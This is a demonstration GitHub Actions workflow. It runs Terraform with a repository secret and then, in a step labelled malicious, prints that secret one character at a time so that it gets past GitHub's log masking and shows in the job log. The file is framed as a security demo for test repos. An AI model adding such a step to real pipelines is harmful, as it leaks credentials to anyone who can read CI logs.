# DEMO: Shows how a malicious step can exfiltrate Terraform outputs
# character-by-character to bypass GitHub Actions log masking.
# Use only with dummy values in a test repo.

name: Terraform output exfil (demo)

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  terraform-exfil:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Terraform
        uses: hashicorp/setup-terraform@v3
        with:
          terraform_version: "1.6.0"

      - name: Terraform init
        working-directory: terraform
        run: terraform init -input=false

      - name: Terraform plan
        working-directory: terraform
        env:
          TF_VAR_db_password: ${{ secrets.TOP_SECRET_SECRET }}
        run: terraform plan -input=false

      # MALICIOUS STEP (demo): Secret was passed into the job for Terraform;
      # any step can read it. Print char-by-char to bypass GitHub's log masking.
      - name: "[DEMO] Exfil secret via char-by-char print"
        env:
          SECRET_VALUE: ${{ secrets.TOP_SECRET_SECRET }}
        run: |
          echo "Direct output (will be masked):"
          echo "$SECRET_VALUE"
          echo ""
          echo "Bypass: character-by-character (secret visible in log):"
          echo "$SECRET_VALUE" | sed 's/./& /g'
